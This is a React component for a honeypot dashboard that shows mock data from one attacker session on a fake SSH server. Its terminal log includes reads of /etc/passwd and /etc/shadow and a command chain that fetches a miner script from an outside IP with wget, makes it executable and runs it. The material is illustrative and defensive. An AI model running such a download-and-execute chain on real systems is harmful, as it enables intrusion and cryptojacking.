import { Terminal, Code, Cpu, Database, Network } from 'lucide-react';

const SessionAnalysis = () => {
  return (
    <div className="space-y-6">
      <div className="shrink-0">
        <h2 className="text-2xl font-bold text-[var(--color-text-main)] flex items-center gap-2">
          <Terminal className="text-[var(--color-primary)]" /> Session Analysis
        </h2>
        <p className="text-[var(--color-text-muted)]">Deep dive into a specific attacker's interaction with the honeypot</p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-1 space-y-6">
          <div className="glass-panel p-6">
            <h3 className="text-lg font-bold text-[var(--color-text-main)] mb-4">Session Info</h3>
            <div className="space-y-3">
              <div className="flex justify-between border-b border-[var(--color-border-glass)] pb-2">
                <span className="text-[var(--color-text-muted)] text-sm">Session ID</span>
                <span className="text-[var(--color-text-main)] text-sm font-mono">sess_9a8b7c6d</span>
              </div>
              <div className="flex justify-between border-b border-[var(--color-border-glass)] pb-2">
                <span className="text-[var(--color-text-muted)] text-sm">Attacker IP</span>
                <span className="text-[var(--color-text-main)] text-sm font-mono">185.15.58.221</span>
              </div>
              <div className="flex justify-between border-b border-[var(--color-border-glass)] pb-2">
                <span className="text-[var(--color-text-muted)] text-sm">Target Honeypot</span>
                <span className="text-[var(--color-text-main)] text-sm">Fake SSH Server</span>
              </div>
              <div className="flex justify-between pb-2">
                <span className="text-[var(--color-text-muted)] text-sm">Duration</span>
                <span className="text-[var(--color-text-main)] text-sm">14m 23s</span>
              </div>
            </div>
          </div>

          <div className="glass-panel p-6 border-l-4 border-l-[var(--color-primary)]">
            <h3 className="text-lg font-bold text-[var(--color-text-main)] mb-2 flex items-center gap-2">
              <Cpu size={20} className="text-[var(--color-primary)]" /> AI Summary
            </h3>
            <p className="text-sm text-[var(--color-text-muted)] leading-relaxed">
              Attacker successfully authenticated using compromised credentials (root/admin123). 
              Once logged in, they attempted to download a script via wget, change file permissions, 
              and execute a cryptocurrency miner. The honeypot isolated the execution and fed fake CPU stats back to the attacker.
            </p>
          </div>
          
          <div className="glass-panel p-6">
            <h3 className="text-lg font-bold text-[var(--color-text-main)] mb-4">Files Accessed</h3>
            <ul className="space-y-2 font-mono text-sm">
              <li className="flex items-center gap-2 text-[var(--color-text-muted)] hover:text-[var(--color-text-main)] transition-colors cursor-pointer">
                <Database size={14} /> /etc/passwd
              </li>
              <li className="flex items-center gap-2 text-[var(--color-text-muted)] hover:text-[var(--color-text-main)] transition-colors cursor-pointer">
                <Database size={14} /> /etc/shadow
              </li>
              <li className="flex items-center gap-2 text-green-400 hover:text-green-300 transition-colors cursor-pointer">
                <Code size={14} /> /tmp/miner.sh
              </li>
            </ul>
          </div>
        </div>

        <div className="lg:col-span-2 glass-panel flex flex-col h-[800px]">
          <div className="p-4 border-b border-[var(--color-border-glass)] bg-[var(--color-bg-card)] flex justify-between items-center shrink-0">
            <h3 className="text-sm font-bold text-[var(--color-text-muted)] uppercase flex items-center gap-2">
              <Network size={16} /> Interactive Terminal Log
            </h3>
            <button className="text-xs px-3 py-1 bg-[var(--color-bg-active)] hover:bg-[var(--color-bg-active-hover)] rounded text-[var(--color-text-main)] transition-colors">
              Raw Format
            </button>
          </div>
          
          <div className="p-6 font-mono text-sm overflow-y-auto custom-scrollbar flex-1 bg-[var(--color-bg-base)]">
            <div className="text-green-400 mb-2">root@vps-server:~# whoami</div>
            <div className="text-[var(--color-text-muted)] mb-4">root</div>
            
            <div className="text-green-400 mb-2">root@vps-server:~# cat /etc/os-release</div>
            <div className="text-[var(--color-text-muted)] mb-4">
              PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"<br/>
              NAME="Debian GNU/Linux"<br/>
              VERSION_ID="11"<br/>
              VERSION="11 (bullseye)"
            </div>
            
            <div className="text-green-400 mb-2">root@vps-server:~# wget http://185.15.58.221/miner.sh -O /tmp/miner.sh</div>
            <div className="text-[var(--color-text-muted)] mb-4">
              --2026-07-12 22:45:12--  http://185.15.58.221/miner.sh<br/>
              Connecting to 185.15.58.221:80... connected.<br/>
              HTTP request sent, awaiting response... 200 OK<br/>
              Length: 1452 (1.4K) [application/x-sh]<br/>
              Saving to: '/tmp/miner.sh'
            </div>
            
            <div className="text-green-400 mb-2">root@vps-server:~# chmod +x /tmp/miner.sh</div>
            <div className="text-[var(--color-text-muted)] mb-4"></div>
            
            <div className="text-green-400 mb-2">root@vps-server:~# ./tmp/miner.sh &</div>
            <div className="text-[var(--color-text-muted)] mb-4">[1] 14892</div>
            
            <div className="text-green-400 mb-2 animate-pulse">root@vps-server:~# â–ˆ</div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default SessionAnalysis;
